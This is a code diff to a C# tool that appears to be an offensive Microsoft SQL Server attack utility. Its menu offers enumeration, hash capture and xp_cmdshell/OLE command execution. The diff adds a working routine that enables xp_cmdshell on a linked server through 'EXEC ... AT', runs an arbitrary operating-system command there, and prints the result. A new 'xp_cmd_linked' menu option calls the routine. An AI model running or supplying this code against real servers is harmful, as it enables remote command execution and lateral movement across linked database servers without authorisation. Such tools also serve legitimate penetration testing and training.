@@ -9,6 +9,43 @@ namespace SQL
     class Program
     {
 
+        static void xp_cmdshell_linked_server(SqlConnection con, string servername, string cmd)
+        {
+            try
+            {
+                String enable_xpcmd_1 = $"EXEC ('sp_configure ''show advanced options'', 1; reconfigure;') AT [{servername}]";
+                String enable_xpcmd_2 = $"EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') at [{servername}]";
+                
+                SqlCommand sqlcommand = new SqlCommand(enable_xpcmd_1, con);
+                SqlDataReader reader = sqlcommand.ExecuteReader();
+                reader.Close();
+                sqlcommand = new SqlCommand(enable_xpcmd_2, con);
+                reader = sqlcommand.ExecuteReader();
+                reader.Close();
+
+            }
+            catch (Exception ex)
+            {
+                Console.ForegroundColor = ConsoleColor.Red;
+                Console.WriteLine("Looks like you cant reconfigure server and enable xp_cmdshell...");
+                Console.ResetColor();
+                Console.WriteLine("But we will try anyway!");
+            }
+            finally
+            {
+                string execCmd = $"exec ('xp_cmdshell ''{cmd}''') at [{servername}]";
+                SqlCommand command = new SqlCommand(execCmd, con);
+                SqlDataReader reader = command.ExecuteReader();
+                Console.WriteLine("Result of command is: ");
+                while (reader.Read())
+                {
+                    Console.WriteLine(reader[0]);
+                }
+
+                reader.Close();
+            }
+        }
+
         static void enum_linked_servers(SqlConnection con, out List<string> servers)
         {
             servers = new List<string>();
@@ -275,6 +312,7 @@ namespace SQL
             Console.WriteLine("  xp_cmd <command>   Command to be executed using xp_cmdshell");
             Console.WriteLine("  ole_cmd <command>   Command to be executed using OLE");
             Console.WriteLine("  show_linked");
+            Console.WriteLine("  xp_cmd_linked <server> <command>");
         }
 
 
@@ -376,6 +414,9 @@ namespace SQL
                 case "show_linked":
                     List<string> linked_serverst;
                     enum_linked_servers(con, out linked_serverst);
+                    break;
+                case "xp_cmd_linked":
+                    xp_cmdshell_linked_server(con, args[3], args[4]);
                     break;
                 default:
                     Console.WriteLine($"Error: Invalid operation '{operation}'. Supported: 'enum', 'gethash', 'xp_cmd', 'ole_cmd', 'show_linked'");
